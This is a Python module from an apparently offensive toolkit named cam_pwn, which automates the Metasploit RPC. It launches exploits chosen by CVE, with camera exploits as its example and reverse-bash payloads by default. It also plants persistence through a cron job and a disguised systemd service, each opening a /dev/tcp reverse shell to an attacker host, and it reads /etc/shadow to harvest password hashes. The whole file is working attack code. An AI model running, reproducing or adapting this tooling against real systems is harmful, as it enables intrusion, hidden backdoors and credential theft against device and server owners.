"""
Metasploit RPC automation: reverse shell, persistence (cron/systemd), credential harvesting.
Auto-selects module and payload from CVE via cam_pwn.payloads.
"""

import logging
from typing import Any, Dict, List, Optional

from cam_pwn.config import get

logger = logging.getLogger(__name__)

try:
    from pymetasploit3.msfrpc import MsfRpcClient
    MSFRPC_AVAILABLE = True
except ImportError:
    MSFRPC_AVAILABLE = False


class MetasploitClient:
    """Wrapper for Metasploit RPC: run exploits, get shell, add persistence."""

    def __init__(
        self,
        host: Optional[str] = None,
        port: Optional[int] = None,
        password: Optional[str] = None,
    ):
        self.host = host or get("exploitation.metasploit_rpc_host", "127.0.0.1")
        self.port = port or get("exploitation.metasploit_rpc_port", 55553)
        self.password = password or get("exploitation.metasploit_rpc_pass", "")
        self._client: Optional[Any] = None

    @property
    def client(self):
        if not MSFRPC_AVAILABLE:
            raise RuntimeError("pymetasploit3 not installed")
        if self._client is None:
            self._client = MsfRpcClient(
                self.password,
                server=self.host,
                port=self.port,
            )
        return self._client

    def run_exploit(
        self,
        module: str,
        rhost: str,
        rport: int = 80,
        lhost: Optional[str] = None,
        lport: Optional[int] = None,
        options: Optional[Dict[str, Any]] = None,
        msf_type: str = "exploit",
        payload: Optional[str] = None,
    ) -> Dict[str, Any]:
        """
        Run a Metasploit module (exploit or auxiliary).
        module: e.g. exploit/linux/http/hikvision_cve_2021_36260_blind or auxiliary/gather/...
        msf_type: "exploit" or "auxiliary"
        Returns dict with session_id if shell obtained (exploit only).
        """
        lhost = lhost or get("exploitation.reverse_shell_lhost")
        lport = lport or get("exploitation.reverse_shell_lport", 4444)
        opts = {
            "RHOSTS": rhost,
            "RPORT": str(rport),
            "LHOST": lhost or "127.0.0.1",
            "LPORT": str(lport),
            **((options or {}) if isinstance(options, dict) else {}),
        }
        try:
            expl = self.client.modules.use(msf_type, module)
            for k, v in opts.items():
                if hasattr(expl, "required") and k in getattr(expl, "opts", {}):
                    expl[k] = v
                elif hasattr(expl, "opts") and k in expl.opts:
                    expl[k] = v
            if msf_type == "auxiliary":
                result = expl.run() if hasattr(expl, "run") else expl.execute()
            elif payload:
                result = expl.execute(payload=payload)
            else:
                result = expl.execute(payload="cmd/unix/reverse_bash")
            sessions = getattr(self.client, "sessions", None)
            sess_list = sessions.list if sessions and hasattr(sessions, "list") else {}
            last = list(sess_list.keys())[-1] if sess_list else None
            return {"success": True, "session_id": str(last) if last else None, "result": str(result)}
        except Exception as e:
            logger.exception("Msf %s failed: %s", msf_type, e)
            return {"success": False, "error": str(e)}

    def run_exploit_for_cve(
        self,
        cve_id: str,
        rhost: str,
        rport: int = 80,
        lhost: Optional[str] = None,
        lport: Optional[int] = None,
        options: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        """
        Run the Metasploit module mapped to this CVE (from cam_pwn.payloads).
        If no module is mapped, returns error. Use for auto payload by vulnerability.
        """
        from cam_pwn.payloads import get_metasploit_module_for_cve

        info = get_metasploit_module_for_cve(cve_id)
        if not info:
            return {"success": False, "error": f"No Metasploit module for {cve_id}"}
        return self.run_exploit(
            module=info["module"],
            rhost=rhost,
            rport=rport,
            lhost=lhost,
            lport=lport,
            options=options,
            msf_type=info["type"],
            payload=info.get("payload"),
        )

    def add_persistence_cron(self, session_id: str, lhost: str, lport: int) -> bool:
        """Add cron job for reverse shell persistence (via session)."""
        try:
            shell = self.client.sessions.session(session_id)
            # Example: add crontab entry
            cmd = f"echo '*/5 * * * * bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' | crontab -"
            shell.write(cmd)
            return True
        except Exception as e:
            logger.warning("Persistence cron failed: %s", e)
            return False

    def add_persistence_systemd(self, session_id: str, lhost: str, lport: int) -> bool:
        """Add systemd user service for persistence."""
        try:
            shell = self.client.sessions.session(session_id)
            svc = f"""[Unit]
Description=Cam
After=network.target
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
Restart=always
[Install]
WantedBy=default.target"""
            shell.write("mkdir -p ~/.config/systemd/user")
            shell.write(f"echo '{svc}' > ~/.config/systemd/user/cam.service")
            shell.write("systemctl --user enable cam.service")
            return True
        except Exception as e:
            logger.warning("Persistence systemd failed: %s", e)
            return False

    def harvest_shadow(self, session_id: str) -> Optional[str]:
        """Read /etc/shadow via shell session (for authorized testing)."""
        try:
            shell = self.client.sessions.session(session_id)
            shell.write("cat /etc/shadow")
            import time
            time.sleep(0.5)
            return shell.read() if hasattr(shell, "read") else None
        except Exception as e:
            logger.warning("Harvest shadow failed: %s", e)
            return None
